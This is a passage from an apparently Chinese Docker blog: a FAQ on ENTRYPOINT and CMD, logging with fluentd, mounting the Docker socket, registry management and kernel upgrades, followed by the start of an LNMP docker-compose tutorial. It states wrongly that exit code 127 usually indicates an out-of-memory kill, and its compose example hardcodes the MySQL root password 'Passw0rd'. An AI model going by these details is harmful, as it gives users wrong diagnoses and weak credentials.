引擎，但是它们处于上下文目录下，这种情况，我们需要使用 .dockerignore文件来过滤不必要的内容。.dockerignore 文件应该放置于上下文顶级目录下，内容格式和 .gitignore 一样。 12tmpdb 这样就过滤了 tmp 和db目录，它们不会被作为上下文的一部分发给 dockerd引擎。 问：ENTRYPOINT 和 CMD 到底有什么不同？答： Dockerfile 的目的是制作镜像，换句话说，实际上是准备的是主进程运行环境。那么准备好后，需要执行一个程序才可以启动主进程，而启动的办法就是调用 ENTRYPOINT，并且把 CMD 作为参数传进去运行。也就是下面的概念： 1ENTRYPOINT "CMD" 假设有个 myubuntu 镜像 ENTRYPOINT 是 sh -c，而我们 docker run -it myubuntu uname -a。那么 uname -a就是运行时指定的 CMD，那么 Docker 实际运行的就是结合起来的结果： 1sh -c "uname -a" 如果没有指定 ENTRYPOINT，那么就只执行 CMD； 如果指定了 ENTRYPOINT 而没有指定 CMD，自然执行 ENTRYPOINT; 如果 ENTRYPOINT 和 CMD 都指定了，那么就如同上面所述，执行 ENTRYPOINT &quot;CMD&quot;； 如果没有指定 ENTRYPOINT，而 CMD 用的是上述那种 shell 命令的形式，则自动使用 sh -c 作为 ENTRYPOINT。 注意最后一点的区别，这个区别导致了同样的命令放到 CMD 和 ENTRYPOINT 下效果不同，因此有可能放在 ENTRYPOINT 下的同样的命令，由于需要 tty 而运行时忘记了给（比如忘记了docker-compose.yml 的 tty:true）导致运行失败。 这种用法可以很灵活，比如我们做个 git 镜像，可以把 git 命令指定为 ENTRYPOINT，这样我们在 docker run 的时候，直接跟子命令即可。比如 docker run git log就是显示日志。 问：拿到一个镜像，如何获得镜像的 Dockerfile ？答： 直接去 Docker Hub 上看：大多数 Docker Hub上的镜像都会有 Dockerfile，直接在 Docker Hub 的镜像页面就可以看到 Dockerfile 的链接； 如果没有 Dockerfile，一般这类镜像就不应该考虑使用了，这类黑箱似的镜像很容有有问题。如果是什么特殊原因，那继续往下看； docker history 可以看到镜像每一层的信息，包括命令，当然黑箱镜像的 commit 看不见操作； docker inspect 可以分析镜像很多细节。 直接运行镜像，进入shell，然后根据上面的分析结果去进一步分析日志、文件内容及变化。 问：Docker 日志都在哪里？日志分两类，一类是 Docker 引擎日志；另一类是 容器日志。 Docker 引擎日志 Docker 引擎日志 一般是交给了 Upstart(Ubuntu 14.04)或者 systemd (CentOS 7, Ubuntu 16.04)。前者一般位于 /var/log/upstart/docker.log 下，后者一般通过 jounarlctl -u docker来读取或系统日志里面/var/log/messages 。 容器日志 容器的日志 则可以通过 docker logs 命令来访问，而且可以像 tail -f 一样，使用 docker logs -f 来实时查看。如果使用 Docker Compose，则可以通过 docker-compose logs &lt;服务名&gt;来查看。 如果深究其日志位置，每个容器的日志默认都会以 json-file 的格式存储于/var/lib/docker/containers/&lt;容器id&gt;/&lt;容器id&gt;-json.log下，不过并不建议去这里直接读取内容，因为 Docker 提供了更完善地日志收集方式 - Docker 日志收集驱动。 关于日志收集，Docker 内置了很多日志驱动，可以通过类似于fluentd, syslog 这类服务收集日志。无论是 Docker 引擎，还是容器，都可以使用日志驱动。比如，如果打算用 fluentd 收集某个容器日志，可以这样启动容器： 12345$ docker run -d \ --log-driver=fluentd \ --log-opt fluentd-address=10.2.3.4:24224 \ --log-opt tag="docker.&#123;&#123;.Name&#125;&#125;" \ nginx 其中 10.2.3.4:24224 是 fluentd 服务地址，实际环境中应该换成真实的地址。 问：不同容器的日志汇聚到 fluentd 后如何区分？答： 有两种概念的区分，一种是区分开不同容器的日志，另一种是区分开来不同服务的日志。 区分不同容器的日志是很直观的想法。运行了几个不同的容器，日志都送向日志收集，那么显然不希望nginx容器的日志和 MySQL 容器的日志混杂在一起看。 但是在Swarm 集群环境中，区分容器就已经不再是合理的做法了。因为同一个服务可能有许多副本，而又有很多个服务，如果一个个的容器区分去分析，很难看到一个整体上某个服务的服务状态是什么样子的。而且，容器是短生存周期的，在维护期间容器生存死亡是很常见的事情。如果是像传统虚拟机那样子以容器为单元去分析日志，其结果很难具有价值。因此更多的时候是对某一个服务的日志整体分析，无需区别日志具体来自于哪个容器，不需要关心容器是什么时间产生以及是否消亡，只需要以服务为单元去区分日志即可。 这两类的区分日志的办法，Docker 都可以做到，这里我们以 fluentd 为例说明。 123456789101112131415161718version: '2'services: web: image: nginx:1.11-alpine ports: - "3000:80" labels: section: frontend group: alpha service: web image: nginx base_os: alpine logging: driver: fluentd options: fluentd-address: "localhost:24224" tag: "frontend.web.nginx.&#123;&#123;.Name&#125;&#125;" labels: "section,group,service,image,base_os" 这里我们运行了一个 nginx:alpine 的容器，服务名为 web。容器的日志使用 fluentd 进行收集，并且附上标签 frontend.web.nginx.&lt;容器名&gt;。除此以外，我们还定义了一组 labels，并且在 logging 的 options 中的 labels中指明希望哪些标签随日志记录。这些信息中很多一部分都会出现在所收集的日志里。 让我们来看一下 fluentd收到的信息什么样子的。 1234567891011121314151617181920212223&#123; "frontend.web.nginx.service_web_1": &#123; "image": "nginx", "base_os": "alpine", "container_id": "f7212f7108de033045ddc22858569d0ac50921b043b97a2c8bf83b1b1ee50e34", "section": "frontend", "service": "web", "log": "172.20.0.1 - - [09/Dec/2016:15:02:45 +0000] \"GET / HTTP/1.1\" 200 612 \"-\" \"curl/7.49.1\" \"-\"", "group": "alpha", "container_name": "/service_web_1", "source": "stdout", "remote": "172.20.0.1", "host": "-", "user": "-", "method": "GET", "path": "/", "code": "200", "size": "612", "referer": "-", "agent": "curl/7.49.1", "forward": "-" &#125;&#125; 如果去除nginx 正常的访问日志项目外，我们就可以更清晰的看到有哪些元数据信息可以利用了。 123456789101112 "frontend.web.nginx.service_web_1": &#123; "image": "nginx", "base_os": "alpine", "container_id": "f7212f7108de033045ddc22858569d0ac50921b043b97a2c8bf83b1b1ee50e34", "section": "frontend", "service": "web", "group": "alpha", "container_name": "/service_web_1", "source": "stdout", &#125;&#125; 可以看到，我们在 logging 下所有指定的 labels 都在。我们完全可以对每个服务设定不同的标签，通过标签来区分服务。比如这里，我们对 web 服务指定了 service=web 的标签，我们同样可以对数据库的服务设定标签为 service=mysql，这样在汇总后，只需要对 service 标签分组过滤即可，分离聚合不同服务的日志。 此外，我们可以设置不止一个标签，比如上面的例子，我们设置了多组不同颗粒度的标签，在后期分组的时候，可以很灵活的进行组合，以满足不同需求。 此外，注意 frontend.web.nginx.service_web_1，这是我们之前利用 --log-opt tag=frontend.web.nginx.&lt;容器名&gt; 进行设定的，其中&lt;容器名&gt; 我们使用的是 Go 模板表达式。Go 模板很强大，我们可以用它实现非常复杂的标签。在 fluentd 中，&lt;match&gt;项可以根据标签来进行筛选。 这里可以唯一表示容器的，有容器 ID container_id，而容器名container_name 也从某种程度上可以用来区分不同容器。因此进行容器区分日志的时候，可以使用这两项。 还有一个 source，这表示了日志是从标准输出还是标准错误输出得到的，由此可以区分正常日志和错误日志。 现在我们可以知道，除了容器自身输出的信息外，Docker 还可以为每一个容器的日志添加很多元数据，以帮助后期的日志处理中应对不同需求的搜索和过滤。 在后期处理中，fluentd中可以利用&lt;match&gt; 或者 &lt;filter&gt; 插件根据 tag 或者其它元数据进行分别处理。而日志到了 ElasticSearch这类系统后，则可以用更丰富的查询语言进行过滤、聚合。 问：为什么容器一运行就退出啊？答： 这是初学 Docker 常常碰到的问题，此时还以虚拟机来理解 Docker，认为启动 Docker 就是启动虚拟机，也没有搞明白前台和后台的区别。 首先，碰到这类问题应该查日志和容器主进程退出码。 检查容器日志： 1docker logs &lt;容器ID&gt; 查看容器退出码： 123CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMEScc2aa3f4745f ubuntu "/bin/bash" 23 hours ago Exited (0) 22 hours ago clever_lewin25510a2cb171 twang2218/gitlab-ce-zh:8.15.3 "/assets/wrapper" 2 days ago Exited (127) 2 days ago 在 STATUS 一栏中，可以看到退出码是多少。 如果看到了 Exited (127) 那很可能是由于内存超标导致触发 Out Of Memory 然后被强制终止了。 如果看到了 Exited (0)，这说明容器主进程正常退出了。 如果是其他情况，应该检查容器日志。 初学 Docker 的人常常会不理解既然正常怎么会退出的意思。不得不在强调一遍，Docker 不是虚拟机，容器只是进程。因此当执行 docker run的时候，实际所做的只是启动一个进程，如果进程退出了，那么容器自然就终止了。 那么进程为什么会退出？ 如果是执行 service nginx start 这类启动后台服务程序的命令，那说明还是把 Docker 当做虚拟机了。Docker 启动的是进程，因此所谓的后台服务应该放到前台，比如应该 nginx -g &#39;daemon off;&#39;这样直接前台启动应用才对。 如果发现 COMMAND 一栏是 /bin/bash，那还是说明把 Docker 当虚拟机了。COMMAND应该是应用程序，而不交互式操作界面，容器不需要交互式操作界面。此外，如果使用 /bin/bash 希望起一个交互式的界面，那么也必须提供给其输入和终端，因此必须加 -it 选项，比如 docker run -it ubuntu /bin/bash 问：我想在docker容器里面运行docker命令，该如何操作？答： 首先，不要在 Docker 容器中安装、运行 Docker 引擎，也就是所谓的 Docker In Docker (DIND) 因为Docker-in-Docker有很多问题和缺陷，参考文章： https://jpetazzo.github.io/2015/09/03/do-not-use-docker-in-docker-for-ci/ 为了让容器内可以构建镜像，应该使用 Docker Remote API 的客户端来直接调用宿主的 Docker Engine。可以是原生的 Docker CLI （docker 命令），也可以是其它语言的库。 为 Jenkins 添加 Docker 命令行 12345678910FROM jenkins:alpine# 下载安装Docker CLIUSER rootRUN curl -O https://get.docker.com/builds/Linux/x86_64/docker-latest.tgz \ &amp;&amp; tar zxvf docker-latest.tgz \ &amp;&amp; cp docker/docker /usr/local/bin/ \ &amp;&amp; rm -rf docker docker-latest.tgz# 将 `jenkins` 用户的组 ID 改为宿主 `docker` 组的组ID，从而具有执行 `docker` 命令的权限。ARG DOCKER_GID=999USER jenkins:$&#123;DOCKER_GID&#125; 在这个例子里，我们下载了静态编译的 docker 可执行文件，并提取命令行安装到系统目录下。然后调整了 jenkins 用户的组 ID，调整为宿主 docker组ID，从而使其具有执行 docker 命令的权限。 组 ID 使用了 DOCKER_GID 参数来定义，以方便进一步定制。构建时可以通过 --build-arg来改变 DOCKER_GID 的默认值，运行时也可以通过 --user jenkins:1234 来改变运行用户的身份。 用下面的命令来构建镜像（假设镜像名为 jenkins-docker）： 1$ docker build -t jenkins-docker . 如果需要构建时调整 docker 组 ID，可以使用 --build-arg 来覆盖参数默认值： 1$ docker build -t jenkins-docker --build-arg DOCKER_GID=1234 . 在启动容器的时候，将宿主的 /var/run/docker.sock 文件挂载到容器内的同样位置，从而让容器内可以通过 unix socket 调用宿主的 Docker 引擎。 比如，可以用下面的命令启动 jenkins： 12345$ docker run --name jenkins \ -d \ -p 8080:8080 \ -v /var/run/docker.sock:/var/run/docker.sock \ jenkins-docker 在 jenkins 容器中，就已经可以执行 docker 命令了，可以通过 docker exec来验证这个结果： 12345678910111213141516171819$ docker exec -it jenkins sh/ $ iduid=1000(jenkins) gid=999(ping) groups=999(ping)/ $ docker versionClient: Version: 1.12.3 API version: 1.24 Go version: go1.6.3 Git commit: 6b644ec Built: Wed Oct 26 23:26:11 2016 OS/Arch: linux/amd64Server: Version: 1.13.0-rc2 API version: 1.25 Go version: go1.7.3 Git commit: 1f9b3ef Built: Wed Nov 23 06:32:39 2016 OS/Arch: linux/amd64/ $ 问：都说不要用 root 去运行服务，但我看到的 Dockerfile 都是用 root 去运行，这不安全吧？答： 并非所有官方镜像的 Dockerfile 都是用 root 用户去执行的。比如mysql 镜像的执行身份就是 mysql 用户；redis 镜像的服务运行用户就是 redis；mongo镜像内的服务执行身份是 mongo 用户；jenkins 镜像内是 jenkins 用户启动服务等等。所以说 “都是用 root 去运行” 是不客观的。 当然，这并不是说在容器内使用 root 就非常危险。容器内的 root 和宿主上的 root 不同，容器内的 root 虽然 uid 也默认为 0，但是却处于一个隔离的命名空间，而且被去掉了大量的特权。容器内的 root 是一个没有什么特权的用户，危险的操作基本都无法执行。 不过，如果用户可以打破这个安全保护，那就是另外一回事了。比如，如果用户挂载了宿主目录给容器，这就是打通了一个容器内的 root操控宿主的一个通道，使得容器内的 root 可以修改所挂载的目录下的任何文件。 因为当前版本的 Docker 中，默认情况下容器的 user namespace 并未开启，所以容器内的用户和宿主用户共享 uid 空间。容器内的 uid 为 0的 root，就被系统视为 uid=0 的宿主 root，因此磁盘读写时，具有宿主root 同等读写权限。这也是为什么一般不推荐挂载宿主目录、特别是挂载宿主系统目录的原因之一。这一切只要定制镜像的时候，容器内不使用root 启动服务就没这个问题了。 当然，上面说的问题只是默认情况下 user namespace不会启用的问题。dockerd 有一个 --userns-remap 参数，只要配置了这个参数，就可以确保容器内的 uid 是独立命名空间，容器内的 uid变到宿主的时候，会被remap 到另一个范围。因此，容器内的 uid=0 的 root 将完全跟 root没有任何关系，仅仅是个普通用户而已。 相关信息请参考官方文档： --userns-remap 的介绍：https://docs.docker.com/engine/reference/commandline/dockerd/#/daemon-user-namespace-options Docker 安全：https://docs.docker.com/engine/security/security/ 问：我在容器里运行 systemctl start xxx 怎么报错啊？答： 如果在容器内使用 systemctl 命令，经常会发现碰到这样的错误： 1Failed to get D-Bus connection: Operation not permitted 这很正常，因为 systemd 是完整系统的服务启动、维护的系统服务程序，而且需要特权去执行。但是容器不是完整系统，既没有配合的服务，也没有特权，所以自然用不了。 如果你碰到这样的问题，只能再次提醒你，Docker 不是虚拟机。试图在容器里执行 systemctl 命令的，大多都是还没有搞明白容器和虚拟机的区别，因为看到了可以有 Shell，就以为这是个虚拟机，试图重复自己在完整系统上的体验。这是用法错误，不要把 Docker 当做虚拟机去用，容器有自己的用法。 Docker 不是虚拟机，容器只是受限进程。 容器内根本不需要后台服务，也不需要服务调度和维护，自然也不需要 systemd。容器只有一个主进程，也就是应用进程。容器的生存周期就是围绕着这个主进程而存在的，所以所试图启动的后台服务，应该改为直接在前台运行，根本不需要也不应该使用 systemctl 命令去在后台加载。日志之类的也是直接从 stdout/stderr 输出，而不是走 journald。 问：容器内的时间和宿主不一致，如何处理？答： 一般情况直接设置环境变量 TZ 就够了，比如： 123$ docker run -it -e TZ=Asia/Shanghai debian bashroot@8e6d6c588328:/# dateTue Dec 13 09:41:21 CST 2016 看到了么？时区调整到了 CST，也就是 China Standard Time - 中国标准时间 ，因此显示就正常了。 还有一种方法在构建镜像的时侯调整下时区： 12FROM centos:7RUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime 问：我想让我的程序平滑退出，为什么截获 SIGTERM 信号不管用啊？答： docker stop, docker service rm 在停止容器时，都会先发 SIGTERM 信号，等待一段时间（默认为 10 秒）后，如果程序没响应，则强行 SIGKILL杀掉进程。 这样应用进程就有机会平滑退出，在接收到SIGTERM 后，可以去 Flush 缓存、完成文件读写、关闭数据库连接、释放文件资源、释放锁等等，然后再退出。所以试图截获 SIGTERM 信号的做法是对的。 但是，可能在截获 SIGTERM 时却发现，却发现应用并没有收到 SIGTERM，于是盲目的认为 Docker 不支持平滑退出，其实并非如此。 还记得我们提到过，Docker 不是虚拟机，容器只是受限进程，而一个容器只应该跑一个主进程的说法么？如果你发现你的程序没有截获到 SIGTERM，那就很可能你没有遵循这个最佳实践的做法。因为SIGTERM只会发给主进程，也就是容器内 PID为1 的进程。 至于说主进程启动的那些子进程，完全看主进程是否愿意转发 SIGTERM 给子进程了。所以那些把 Docker 当做虚拟机用的，主进程跑了个bash，然后 exec进去启动程序的，或者来个 &amp; 让程序跑后台的情况，应用进程必然无法收到 SIGTERM。 还有一种可能是在 Dockerfile 中的 CMD 那行用的是 shell 格式写的命令，而不是 exec格式。还记得前面提到过的 shell 格式的命令，会加一个 sh -c 来去执行么？因此使用 shell 格式写 CMD 的时候，PID 为 1 的进程是 sh，而它不转发信号，所以主程序收不到。 明白了道理，解决方法就很简单，换成 exec 格式，并且将主进程执行文件放在第一位即可。这也是为什么之前推荐 exec 格式的原因之一。 进程管理在Docker容器中和在完整的操作系统有一些不同之处。在每个容器的PID1进程，需要能够正确的处理SIGTERM信号来支持容器应用的优雅退出，同时要能正确的处理孤儿进程和僵尸进程。必要的时候使用Docker新提供的 docker run --init 参数可以解决相应问题。 问：Docker Swarm（一代swarm） 和Swarm mode（二代swarm）两者的区别是什么？答： 因为 docker run 和 docker service create是两个不同理念的东西。 一代 Swarm 中，将 Swarm 集群视为一个巨大的 Docker 主机，本质上和单机没有区别，都是直接调度运行容器。因此依旧使用单机的 docker run的方式来启动特定容器。 二代 Swarm 则改变了这个理念，增加了服务栈(Stack)、服务(Service)、任务(Task) 的概念。在二代 Swarm 中，一组服务可以组成一个整体进行部署，也就是部署服务栈，这相当于是之前的Docker Compose 所完成的目的。但是这次，是真正的针对服务的。 一个服务并非一个容器，一个服务可以有多个副本任务，每个任务对应一个容器。这个概念在一代 Swarm 和单机环境中是没有的，因此 Docker Compose为了实现服务的概念，用了各种办法去模拟，包括使用 labels，使用网络别名等等，但是本质上，依旧是以容器为单位进行运行，也就是本质上还是一组 docker run。 正是由于二代 Swarm 中用户操作的单元是服务，所以传统的以容器为中心的 docker run 就不再适用，因此有新的一组针对服务的命令，docker service。 问：我自建了私有镜像仓库Registry，我如何搜索查询仓库中的镜像？答： 如果只使用开源的 docker registry 自建仓库的话，目前只能用 API 访问其内容。除此以外，官方还有商业版的 Docker Trusted Registry 项目，里面有一些增值的内容在里面，提供了类似于 Docker Hub 似得 UI 等，可以搜索过滤。目前 Docker Trusted Registry 属于 Docker Datacenter 的一部分。 另外，第三方也有一些提供了UI的。比如 VMWare Harbor。VMWare Harbor是 VMWare 中国基于开源 docker registry进一步开发的项目，有更复杂的上层逻辑。包括用户管理、镜像管理、Registry集群之类的功能。Harbor 是开源的，免费的。 第三方的 registry 还有 Java 世界里常见的 Nexus，其第三代支持 Docker Registry API。 或者自己可以编写个脚本去查询： 123456789101112131415161718192021222324252627#!/usr/bin/env pythonimport requests#import simplejson as jsonimport jsonimport sysdef main(): registry = "http://127.0.0.1:5000" ## 自己镜像仓库地址 res = requests.get(registry + "/v2/") #assert res.status_code == 200 res = requests.get(registry + "/v2/_catalog?n=100000") assert res.status_code == 200 repositories = res.json().get("repositories", []) #print("registry reports &#123;&#125; repositories".format(len(repositories))) for repository in repositories: res = requests.get(registry + "/v2/&#123;&#125;/tags/list".format(repository)) tags = res.json().get("tags", None) if tags: for tag in tags: image = format(repository) tag = format(tag) print image+":"+tagif __name__ == "__main__": main() 问：如何删除私有 registry 中的镜像？答： 首先，在默认情况下，docker registry 是不允许删除镜像的，需要在配置config.yml中启用： 12delete: enabled: true 然后，使用 API GET /v2/&lt;镜像名&gt;/manifests/&lt;tag&gt; 来取得要删除的 镜像:Tag 所对应的 digest 。 Registry 2.3 以后，必须加入头 Accept: application/vnd.docker.distribution.manifest.v2+json ，否则取到的 digest 是错误的，这是为了防止误删除。 比如，要删除 myimage:latest 镜像，那么取得 digest 的命令是： 1234$ curl --header "Accept: application/vnd.docker.distribution.manifest.v2+json" \ -I -X HEAD http://192.168.99.100:5000/v2/myimage/manifests/latest \ | grep DigestDocker-Content-Digest: sha256:3a07b4e06c73b2e3924008270c7f3c3c6e3f70d4dbb814ad8bff2697123ca33c 然后调用 API DELETE /v2/&lt;镜像名&gt;/manifests/&lt;digest&gt; 来删除镜像。比如： 1curl -X DELETE http://192.168.99.100:5000/v2/myimage/manifests/sha256:3a07b4e06c73b2e3924008270c7f3c3c6e3f70d4dbb814ad8bff2697123ca33c 至此，镜像已从 registry 中标记删除，外界访问 pull 不到了。但是 registry 的本地空间并未释放，需要等待垃圾收集才会释放。而垃圾收集不可以在线进行，必须停止 registry，然后执行。比如，假设 registry是用Compose 运行的，那么下面命令用来垃圾收集： 123docker-compose stopdocker run -it --name gc --rm --volumes-from registry_registry_1 registry:2 garbage-collect /etc/registry/config.ymldocker-compose start 其中 registry_registry_1 可以替换为实际的 registry 的容器名，而 /etc/registry/config.yml 则替换为实际的 registry 配置文件路径。 参考官网文档： https://docs.docker.com/registry/configuration/#/delete https://docs.docker.com/registry/spec/api/#/deleting-an-image 问：自己架的 registry 怎么任何用户都可以取到镜像？这不安全啊？答： 那是因为没有加认证，不加认证的意思就是允许任何人访问的。 添加认证有两种方式： Registry 配置中加入认证： https://docs.docker.com/registry/configuration/#/auth 123456789auth: token: realm: token-realm service: token-service issuer: registry-token-issuer rootcertbundle: /root/certs/bundle htpasswd: realm: basic-realm path: /path/to/htpasswd 前端架设 nginx 进行认证：https://docs.docker.com/registry/recipes/nginx/ 123456location /v2/ &#123; ... auth_basic "Registry realm"; auth_basic_user_file /etc/nginx/conf.d/nginx.htpasswd; ...&#125; 使用VMWare Harbor部署镜像仓库，Harbor 提供了高级的安全特性，诸如用户管理，访问控制和活动审计等。 问：CentOS 7 默认的内核太老了 3.10，是不是很多 Docker 功能不支持？答： 是的，有一些功能无法支持，比如 overlay2 的存储驱动就无法在CentOS 上使用，但并非所有需要高版本内核的功能都不支持。 比如 Overlay FS 需要 Linux 3.18，而Overlay network 需要 Linux 3.16。而 CentOS 7 内核为 3.10，确实低于这些版本需求。但实际上，红帽团队会把一些新内核的功能 backport 回老的内核。比如overlay fs等。所以一些功能依旧会支持。因此 CentOS 7的 Docker Engine 同样可以支持 overlay network，以及overlay 存储驱动（不是overlay2）。因此在新的 Docker 1.12 中，CentOS/RHEL 7 才有可能支持 Swarm Mode。 即使红帽会把一些高版本内核的功能 backport 回 3.10内核中，这种修修补补出来的功能，并不一定稳定。如果观察 Docker Issue 列表，会发现大量的由于 CentOS 老内核导致的问题，特别是在使用了 1.12 内置的 Swarm Mode 集群功能后，存储、网络出现的问题很多。 所以想要在Centos 系统上更好的使用Docker，建议检查和升级下系统内核： 123456wget http://mirror.rc.usf.edu/compute_lock/elrepo/kernel/el7/x86_64/RPMS/kernel-ml-4.11.1-1.el7.elrepo.x86_64.rpmyum -y install linux-firmwarerpm -ivh kernel-ml-4.11.1-1.el7.elrepo.x86_64.rpmgrub2-set-default 0grub2-mkconfig -o /boot/grub2/grub.cfgpackage-cleanup --oldkernels --count=1 -y 然后需要重启下机器以启用新的内核。 听说 Windows 10、Windows Server 2016 内置 Docker 了？和 Docker 官网下载的 Docker for Windows 有什么区别啊？二者完全不同。 Windows 10 或者 Windows Server 2016 自带的 Docker，被称为 Docker on Windows，其运行于 Windows NT内核至上，以 Docker 类似的方式提供 Windows 容器服务，因此只可以运行 Windows 程序。 而 Docker 官网下载的，被称为 Docker for Windows。这是我们常说的 Docker，它是运行于 Linux 内核上的 Docker。在 Windows 上运行时实际上是在Hyper-V 上的一个 Alpine Linux 虚拟机上运行的 Docker。它只可以运行 Linux 程序。 Docker on Windows 极为臃肿，最小镜像也近 GB，启动时间并不快；而 Docker for Windows 则是正常的 Docker，最小镜像也就几十 KB，一般的镜像都在几百兆以内，而且启动时间基本是毫秒级。 未完待续]]></content>
      <categories>
        <category>系统运维</category>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker 多容器间协作互连范例]]></title>
    <url>%2Fdocker%2FDocker_lnmp%2F</url>
    <content type="text"><![CDATA[LNMP - Docker 多容器间协作互连说明这是一个 Docker 多容器间协作互连的例子。使用的是最常见的 LNMP 的技术栈，既 Nginx + PHP + MySQL。 在这个例子中，我使用的是 Docker Compose，这样比较简洁，如果使用 docker 命令也可以做到同样的效果，当然，过程要相对繁琐一些。 服务在 docker-compose.yml 文件中，定义了3个服务，分别是 nginx, php 和 mysql。 12345678910111213141516services: nginx: image: "$&#123;DOCKER_USER&#125;/lnmp-nginx:v1.2" build: context: . dockerfile: Dockerfile.nginx ... php: image: "$&#123;DOCKER_USER&#125;/lnmp-php:v1.2" build: context: . dockerfile: Dockerfile.php ... mysql: image: mysql:5.7 ... 其中 mysql 服务中的 image: mysql:5.7 是表明使用的是 mysql:5.7 这个镜像。而 nginx 和 php 服务中的 image 含义更为复杂。一方面是说，要使用其中名字的镜像，另一方面，如果这个镜像不存在，则利用其下方指定的 build 指令进行构建。在单机环境，这里的 image 并非必须，只保留 build 就可以。但是在 Swarm 环境中，需要集群中全体主机使用同一个镜像，每个机器自己构建就不合适了，指定了 image 后，就可以在单机 build 并 push 到 registry，然后在集群中执行 up 的时候，才可以自动从 registry 下载所需镜像。这里的镜像名看起来也有些不同： 1image: "$&#123;DOCKER_USER&#125;/lnmp-nginx:v1.2" 其中的 ${DOCKER_USER} 这种用法是环境变量替换，当存在环境变量 DOCKER_USER 时，将会用其值替换 ${DOCKER_USER}。而环境变量从哪里来呢？除了在 Shell 中 export 对应的环境变量外，Docker Compose 还支持一个默认的环境变量文件，既 .env 文件。你可以在项目中看到，docker-compose.yml 的同级目录下，存在一个 .env 文件，里面定义了环境变量。 1DOCKER_USER=twang2218 每次执行 docker-compose 命令的时候，这个 .env 文件就会自动被加载，所以是一个用来定制 compose 文件非常方便的地方。这里我只定义了一个环境变量 DOCKER_USER，当然，可以继续一行一个定义更多的环境变量。 初次之外，还可以明确指定环境变量文件。具体的配置请查看 docker-compose 官方文档。 镜像mysql 服务镜像mysql 服务均直接使用的是 Docker 官方镜像。使用官方镜像并非意味着无法定制，Docker 官方提供的镜像，一般都具有一定的定制能力。 12345678mysql: image: mysql:5.7 ... environment: TZ: 'Asia/Shanghai' MYSQL_ROOT_PASSWORD: Passw0rd command: ['mysqld', '--character-set-server=utf8'] ... 在这个例子中，mysql 服务就通过环境变量 MYSQL_ROOT_PASSWORD，设定了 MySQL 数据库初始密码为 Passw0rd，并且通过 TZ 环境变量指定了国内时区。 并且，我重新指定了启动容器的命令，在 command 中，添加了额外的参数。--character-set-server=utf8，指定了默认字符集。 nginx 服务镜像nginx 官方镜像基本满足需求，但是我们需要添加默认网站的配置文件、以及网站页面目录。 1234FROM nginx:1.11ENV TZ=Asia/ShanghaiCOPY ./nginx.conf /etc/nginx/conf.d/default.confCOPY ./site /usr/share/nginx/html 镜像定制很简单，就是指定时区后，将配置文件、网站页面目录复制到指定位置。 php 服务镜像php 服务较为特殊，由于官方 php 镜像未提供连接 mysql 所需的插件，所以 php 服务无法直接使用官方镜像。在这里，正好用其作为例子，演示如何基于官方镜像，安装插件，定制自己所需的镜像。 对应的Dockerfile： 123456789101112131415161718192021222324252627282930313233343536373839404142FROM php:7-fpmENV TZ=Asia/ShanghaiCOPY sources.list /etc/apt/sources.listRUN set -xe \ &amp;&amp; echo "构建依赖" \ &amp;&amp; buildDeps=" \ build-essential \ php5-dev \ libfreetype6-dev \ libjpeg62-turbo-dev \ libmcrypt-dev \ libpng12-dev \ " \ &amp;&amp; echo "运行依赖" \ &amp;&amp; runtimeDeps=" \ libfreetype6 \ libjpeg62-turbo \ libmcrypt4 \ libpng12-0 \ " \ &amp;&amp; echo "安装 php 以及编译构建组件所需包" \ &amp;&amp; apt-get update \ &amp;&amp; apt-get install -y $&#123;runtimeDeps&#125; $&#123;buildDeps&#125; --no-install-recommends \ &amp;&amp; echo "编译安装 php 组件" \ &amp;&amp; docker-php-ext-install iconv mcrypt mysqli pdo pdo_mysql zip \ &amp;&amp; docker-php-ext-configure gd \ --with-freetype-dir=/usr/include/ \ --with-jpeg-dir=/usr/include/ \ &amp;&amp; docker-php-ext-install gd \ &amp;&amp; echo "清理" \ &amp;&amp; apt-get purge -y --auto-remove \ -o APT::AutoRemove::RecommendsImportant=false \ -o APT::AutoRemove::SuggestsImportant=false \ $buildDeps \ &amp;&amp; rm -rf /var/cache/apt/* \ &amp;&amp; rm -rf /var/lib/apt/lists/*COPY ./php.conf /usr/local/etc/php/conf.d/php.confCOPY ./site /usr/share/nginx/html 前面几行很简单，指定了基础镜像为php:7-fpm，并且设定时区为中国时区，然后用网易的 Debian 源替代默认的源，避免伟大的墙影响普通的包下载。接下来的那一个很多行的 RUN 需要特别的说一下。 初学 Docker，不少人会误以为 Dockerfile 等同于 Shell 脚本，于是错误的用了很多个 RUN，每个 RUN 对应一个命令。这是错误用法，会导致最终镜像极为臃肿。Dockerfile 是镜像定制文件，其中每一个命令都是在定义这一层该如何改变，因此应该遵循最佳实践，将同一类的东西写入一层，并且在结束时清理任何无关的文件。 这一层的目的是安装、构建 PHP 插件，因此真正所需要的是构建好的插件、以及插件运行所需要的依赖库，其它任何多余的文件都不应该存在。所以，在这里可以看到，依赖部分划分为了“构建依赖”以及“运行依赖”，这样在安装后，可以把不再需要的“构建依赖”删除掉，避免因为构建而导致这层多了一些不需要的文件。 这里使用的是官方 php 镜像中所带的 docker-php-ext-install 来安装 php 的插件，并且在需要时，使用 docker-php-ext-configure 来配置构建参数。这两个脚本是官方镜像中为了帮助镜像定制所提供的，很多官方镜像都有这类为镜像定制特意制作的脚本或者程序。这也是官方镜像易于扩展复用的原因之一，他们在尽可能的帮助使用、定制镜像。 更多关于如何定制镜像的信息可以从 Docker Hub 官方镜像的文档中看到。 最后的清理过程中，可以看到除了清除“构建依赖”、以及相关无用软件外，还彻底清空了 apt 的缓存。任何不需要的东西，都应该清理掉，确保这一层构建完毕后，仅剩所需的文件。 在 Dockerfile 的最后，复制配置文件和网页目录到指定位置。 网络在这个例子中，演示了如何使用自定义网络，并利用服务名通讯。 首先，在 docker-compose.yml 文件尾部，全局 networks 部分定义了两个自定义网络，分别名为 frontend，backend。 123networks: frontend: backend: 每个自定义网络都可以配置很多东西，包括网络所使用的驱动、网络地址范围等设置。但是，你可能会注意到这里 frontend、backend 后面是空的，这是指一切都使用默认，换句话说，在单机环境中，将意味着使用 bridge 驱动；而在 Swarm 环境中，使用 overlay 驱动，而且地址范围完全交给 Docker 引擎决定。 然后，在前面services中，每个服务下面的也有一个 networks 部分，这部分是用于定义这个服务要连接到哪些网络上。 1234567891011121314services: nginx: ... networks: - frontend php: ... networks: - frontend - backend mysql: ... networks: - backend 在这个例子中， nginx 接到了名为 frontend 的前端网络； mysql 接到了名为 backend 的后端网络； 而作为中间的 php 